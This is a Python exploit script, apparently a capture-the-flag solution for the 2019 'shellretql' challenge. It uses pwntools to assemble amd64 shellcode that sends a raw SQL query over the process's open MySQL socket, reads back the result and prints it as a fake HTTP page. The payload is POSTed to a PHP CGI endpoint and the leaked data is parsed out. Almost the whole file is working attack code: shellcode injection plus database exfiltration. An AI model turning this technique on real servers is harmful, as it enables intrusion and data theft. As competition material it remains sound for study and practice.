#!/usr/bin/env python2
from pwn import *
import requests
import re

context.arch = "amd64"
context.os = "linux"

host = "http://shellretql.quals2019.oooverflow.io:9090/"
html = """X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<html><body>Hello World!</body></html>"""

delimeter = 'scc'
actual_query = 'SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 1'
query = "select '%s',(%s),'%s';" % (delimeter, actual_query, delimeter[::-1])

shellcode = ""
shellcode += shellcraft.echo(p16(len(query)) + "\x00\x00\x03" + query , 4)
shellcode += shellcraft.read(4, 'rsp', 200)
shellcode += shellcraft.pushstr(html)
shellcode += shellcraft.write(1, 'rsp', 500)

data = {
  "shell": asm(shellcode) + "\x00"
}

import pprint
pprint.pprint(asm(shellcode))

resp = requests.post(host + "/cgi-bin/index.php", data=data)
data = resp.text.split(delimeter)
data = [x.split(delimeter[::-1])[0] for x in data]

for match in data:
    print 'Match:'
    print match
    print
